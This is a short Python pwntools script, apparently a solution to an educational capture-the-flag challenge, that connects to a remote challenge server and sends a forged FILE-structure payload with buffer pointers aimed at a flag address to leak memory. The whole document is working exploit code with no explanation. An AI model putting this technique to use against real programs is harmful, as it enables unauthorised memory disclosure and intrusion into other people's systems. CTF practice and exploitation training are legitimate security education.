from pwn import *
r = remote('edu-ctf.zoolab.org',10009)
#r = process('./chal')
flag = 0x404070

payload = p64(0) * 4
payload += p64(0xfbad0000)
payload += p64(0) * 3
payload += p64(flag)
payload += p64(0) * 2
payload += p64(flag)
payload += p64(flag + 0x3000)
payload += p64(0) * 6

r.send(payload)
r.send(b'123123123123123\x00')
r.interactive()